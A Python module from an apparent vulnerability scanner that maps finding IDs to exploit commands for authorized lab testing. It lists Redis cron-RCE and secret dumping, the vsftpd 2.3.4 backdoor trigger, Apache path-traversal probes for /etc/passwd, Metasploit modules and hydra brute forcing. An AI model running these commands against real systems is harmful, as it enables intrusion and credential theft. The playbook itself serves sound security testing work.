"""Scan-to-exploit playbook: per-rule validation pointers for authorized testing.

Maps each finding rule_id to concrete commands a tester can run to *verify*
the exposure on machines they own or are authorized to test (your vulnlab
rig, your THM/HTB targets, your VMs). Placeholders: {ip} and {port} are
substituted per finding.

Nothing here is auto-executed — these are documentation strings rendered
into the report.
"""

from __future__ import annotations

PLAYBOOK: dict[str, list[str]] = {
    # --- exposed services (exact rule_ids from checks.py) ------------------
    "VS-EXP-REDIS-NOAUTH": [
        "Recon:                  redis-cli -h {ip} -p {port} INFO server && KEYS '*'",
        "Dump cached secrets:    redis-cli -h {ip} -p {port} SAVE && strings dump.rdb",
        "RCE via cron (own box): CONFIG SET dir /var/spool/cron/crontabs/ + dbfilename root + SAVE",
        "msfconsole:             use exploit/linux/redis/redis_replication_cmd_exec; set RHOSTS {ip}",
    ],
    "VS-EXP-REDIS-AUTH": [
        "Crack auth:             hydra -P rockyou.txt redis://{ip}:{port}",
    ],
    "VS-EXP-MEMCACHED-NOAUTH": [
        "Enumerate:              nc {ip} {port}   then send:   stats\\r\\n",
        "Amplification check:    nmap -sU -p {port} --script memcached-info {ip}",
    ],
    "VS-EXP-MEMCACHED": [
        "Enumerate:              nc {ip} {port}   then send:   stats\\r\\n",
    ],
    "VS-EXP-DOCKER": [
        "Confirm daemon access:  curl http://{ip}:{port}/version",
        "Enumerate containers:   curl http://{ip}:{port}/containers/json",
        "Root via privileged container (own box): mount host / into a new container and exec",
    ],
    "VS-EXP-MONGODB": [
        "List databases:         mongosh --host {ip} --port {port} --eval 'db.adminCommand({{listDatabases:1}})'",
    ],
    "VS-FTP-ANON": [
        "Anonymous login:        ftp {ip} {port}   (user anonymous, pass anything)",
        "Recursive pull:         wget -m ftp://anonymous@{ip}:{port}/",
    ],
    "VS-FTP-CLEARTEXT": [
        "Credential sniffing:    tcpdump -i any -A port {port}   (during a login attempt)",
    ],
    "VS-CVE-2011-2523": [
        "Trigger (lab only):     nc {ip} {port}   then send:   USER amongst:) :)",
        "Backdoor shell (6200):  nc {ip} 6200",
        "msfconsole:             use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip}",
    ],
    "VS-CVE-2021-41773": [
        "Traversal probe:        curl --path-as-is http://{ip}:{port}/icons/../../../etc/passwd",
        "msfconsole:             use exploit/multi/http/apache_normalize_path_rce; set RHOSTS {ip}",
    ],
    "VS-CVE-2021-42013": [
        "Traversal probe (double-encoding): curl --path-as-is http://{ip}:{port}/icons/%%2e%%2e/%%2f%%2e%%2e/%%2fetc/%%2fpasswd",
    ],
    "VS-CVE-2024-6387": [
        "Version verify:         ssh -v {ip} 2>&1 | head -5",
        "Race-exploit POC:       searchsploit openssh regreSSHion",
    ],
    "VS-EOL-SOFTWARE": [
        "Hunt known CVEs:        searchsploit <product> <version>",
        "Aggregate CVE list:     nvd.nist.gov query for the reported version",
    ],

    # --- http findings -----------------------------------------------------
    "VS-HTTP-CLEARTEXT": [
        "Confirm interceptability: curl -i http://{ip}:{port}/",
        "Content sniffing:       preview an HTTP session with tcpdump port {port}",
    ],
    "VS-HTTP-DIR-LISTING": [
        "Recursive mirror:       wget -r -np http://{ip}:{port}/",
    ],
    "VS-HTTP-STACKTRACE": [
        "Extract from trace:     grep for file paths, dependency versions, tokens",
    ],
    "VS-HTTP-HSTS": [
        "Confirm absence:        curl -I https://{ip}:{port}  (no Strict-Transport-Security)",
    ],
    "VS-HTTP-CSP": [
        "XSS probe surface:      audit input fields for injectable spots in lab apps",
    ],
    "VS-HTTP-XFO": [
        "Clickjack test:         wrap the app in an <iframe> from a lab page and attempt overlay",
    ],
    "VS-HTTP-XCTO": [
        "MIME-sniff probe:       serve a polyglot file from the lab and check render",
    ],
    "VS-HTTP-REFPOL": [
        "Referrer leak check:    point a lab page's link to an own listener; inspect Referer header",
    ],
    "VS-HTTP-SERVER-VERSION": [
        "Version enumeration:    nikto -h http://{ip}:{port}",
        "Bug-match:              searchsploit <server-string-from-header>",
    ],
    "VS-HTTP-POWERED-BY": [
        "Framework match:        searchsploit <X-Powered-By-string>",
    ],
    "VS-HTTP-ADMIN-OPEN": [
        "Default creds:          hydra -l admin -P rockyou.txt http-get /{ip}",
    ],
    "VS-HTTP-ES-OPEN": [
        "Cluster recon:          curl http://{ip}:{port}/_cat/indices",
    ],
    "VS-HTTP-ES-EXPOSED": [
        "Same as ES-OPEN:        curl http://{ip}:{port}/_cat/indices",
    ],
    "VS-HTTP-DOCKER-VERSION": [
        "Confirm daemon:         curl http://{ip}:{port}/version (see VS-EXP-DOCKER steps)",
    ],
    "VS-HTTP-COOKIE-NO-SECURE": [
        "Cookie theft path:      sniff or MITM the cookie over plain HTTP in lab",
    ],
    "VS-HTTP-COOKIE-NO-HTTPONLY": [
        "XSS-to-cookie chain:    find/key an XSS in the lab app and read document.cookie",
    ],

    # --- tls findings ------------------------------------------------------
    "VS-TLS-EXPIRED": [
        "Confirm chain:          nmap --script ssl-cert -p {port} {ip}",
    ],
    "VS-TLS-EXPIRING": [
        "Plan renewal window now — same chain check as EXPIRED",
    ],
    "VS-TLS-NOT-YET-VALID": [
        "Clock check:            nmap --script ssl-cert -p {port} {ip}; compare validity dates",
    ],
    "VS-TLS-SELF-SIGNED": [
        "Chain print:            openssl s_client -connect {ip}:{port} 2>/dev/null | grep subject",
    ],
    "VS-TLS-HOSTNAME": [
        "Verify warning:         openssl s_client -connect {ip}:{port} | grep verify",
    ],
    "VS-TLS-WEAK-CIPHER": [
        "Cipher enumeration:     nmap --script ssl-enum-ciphers -p {port} {ip}",
    ],
    "VS-TLS-LEGACY": [
        "Legacy protocol check:  nmap --script ssl-enum-ciphers -p {port} {ip}  (look for TLSv1.0/1.1)",
    ],
}


def steps_for(rule_id: str, ip: str, port: int | str) -> list[str]:
    """Return playbook steps for a rule, with {ip}/{port} filled in."""
    steps = PLAYBOOK.get(rule_id)
    if not steps:
        return []
    return [step.format(ip=ip, port=port) for step in steps]
